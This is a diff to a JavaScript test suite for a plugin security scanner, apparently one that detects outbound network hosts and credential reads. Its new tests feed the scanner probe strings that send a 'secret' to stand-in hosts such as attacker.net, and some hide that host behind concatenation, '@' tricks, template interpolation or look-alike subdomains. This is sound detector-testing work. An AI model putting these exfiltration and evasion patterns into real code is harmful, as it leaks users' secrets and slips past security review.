@@ -211,6 +211,18 @@ describe('scanShape', () => {
     expect(report.redLines.some(l => l.startsWith('reads credentials/secrets'))).toBe(false)
   })
 
+  it('does not red-line wrapper method names through an alias of an unbound keychain name', () => {
+    const report = auditPlugin(input({
+      'a.js': [
+        'const keychain = new Map()',
+        'const k = keychain',
+        'const token = await k.getToken()',
+        "await fetch('https://api.example.net/x', { headers: { token } })",
+      ].join('\n'),
+    }))
+    expect(report.redLines.some(l => l.startsWith('reads credentials/secrets'))).toBe(false)
+  })
+
   it('red-lines wrapper method names once keychain is bound by require', () => {
     const report = auditPlugin(input({
       'a.js': [
@@ -399,10 +411,29 @@ describe('scanShape', () => {
       'a.js': [
         'const svg = { xmlns: "http://www.w3.org/2000/svg" }',
         'out += \'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\'',
+        // pdf.js XFA namespace table (dsh-herta, issue #8).
+        'const jl={config:{id:0,check:(e)=>e.startsWith("http://www.xfa.org/schema/xci/")},datasets:{id:2,check:(e)=>e.startsWith("http://www.xfa.org/schema/xfa-datasets/")}}',
       ].join('\n'),
     }))
     expect(destinations).toEqual([])
     expect(shapeRedLines(['network'], destinations)).toEqual([])
+  })
+
+  it('still flags identifier hosts written without a path, on a subdomain, or as a prefix', () => {
+    const probes = [
+      'fetch("http://www.w3.org" + ".attacker.net/" + secret)',
+      'fetch("http://www.w3.org".concat(".attacker.net"))',
+      'fetch(["http://www.w3.org", ".attacker.net"].join(""))',
+      'fetch("http://www.w3.org" + "@attacker.net/")',
+      'fetch("http://www.xfa.org" + ".attacker.net/" + secret)',
+      'fetch("http://cdn.xfa.org/x")',
+      'fetch("http://www.xfa.org.attacker.net/x")',
+    ]
+    for (const probe of probes) {
+      const { destinations } = scanShape(input({ 'a.js': probe }))
+      expect(destinations.some(d => d.kind === 'http-host'), probe).toBe(true)
+      expect(shapeRedLines(['network'], destinations), probe).not.toEqual([])
+    }
   })
 
   it('does not read bundled format identifiers as plaintext requests', () => {
@@ -424,6 +455,8 @@ describe('scanShape', () => {
       'fetch("http://musicbrainz.org.attacker.test2/x")',
       'fetch("http://musicbrainz.org" + ".attacker.net/" + secret)',
       'fetch("http://musicbrainz.org".concat(".attacker.net"))',
+      'fetch(["http://musicbrainz.org", ".attacker.net"].join(""))',
+      'const base = "http://musicbrainz.org"',
       'fetch("http://www.apple.com/DTDs/PropertyList-1.0.dtd" + "/../../exfil")',
     ]
     for (const probe of probes) {
@@ -557,11 +590,56 @@ describe('scanShape', () => {
   })
 
   it('skips template http hosts that are not literals', () => {
+    for (const probe of [
+      'fetch(`http://${host}/x`)',
+      'fetch(`http://api.${region}.attacker.net/x`)',
+      'fetch(`http://${"attacker.net"}/x`)',
+      'fetch(`http://localhost${port}/x`)',
+    ]) {
+      const { destinations } = scanShape(input({ 'a.js': probe }))
+      expect(destinations.some(d => d.kind === 'http-host'), probe).toBe(false)
+      expect(shapeRedLines(['network'], destinations), probe).toEqual([])
+    }
+  })
+
+  it('reads the static host when ${…} follows a complete host inside the authority', () => {
+    const cases: Array<[string, string]> = [
+      ['fetch(`http://attacker.net${port}/x`)', 'attacker.net'],
+      ['fetch(`http://attacker.net:${port}/x`)', 'attacker.net'],
+      ['fetch(`http://attacker.net${""}/x?d=${secret}`)', 'attacker.net'],
+      ['fetch(`http://www.w3.org${suffix}`)', 'www.w3.org'],
+    ]
+    for (const [probe, host] of cases) {
+      const { destinations } = scanShape(input({ 'a.js': probe }))
+      expect(destinations.filter(d => d.kind === 'http-host').map(d => d.value), probe).toEqual([host])
+      expect(shapeRedLines(['network'], destinations), probe).not.toEqual([])
+    }
+    const https = scanShape(input({ 'a.js': 'fetch(`https://api.github.com${endpoint}`)' }))
+    expect(https.destinations.map(d => `${d.kind}:${d.value}`)).toEqual(['https-host:api.github.com'])
+  })
+
+  it('reads the static host of a template URL interpolated only after the authority', () => {
     const { destinations } = scanShape(input({
-      'a.js': 'fetch(`http://${host}/x`)',
+      'a.js': [
+        'fetch(`http://attacker.net/x?d=${secret}`)',
+        'fetch(`https://api.attacker.org/${path}`)',
+        'fetch(`http://plain.attacker.com?k=${key}`)',
+      ].join('\n'),
     }))
-    expect(destinations.some(d => d.kind === 'http-host')).toBe(false)
-    expect(shapeRedLines(['network'], destinations)).toEqual([])
+    expect(destinations.filter(d => d.kind === 'http-host').map(d => d.value).sort())
+      .toEqual(['attacker.net', 'plain.attacker.com'])
+    expect(destinations.some(d => d.kind === 'https-host' && d.value === 'api.attacker.org')).toBe(true)
+    expect(shapeRedLines(['network'], destinations)).not.toEqual([])
+  })
+
+  it('keeps identifier-host and placeholder exemptions for template URLs', () => {
+    const { destinations } = scanShape(input({
+      'a.js': [
+        'const ns = `http://www.w3.org/2000/${kind}`',
+        'fetch(`https://example.com/docs/${page}`)',
+      ].join('\n'),
+    }))
+    expect(destinations).toEqual([])
   })
 
   it('captures sensitive env key names', () => {
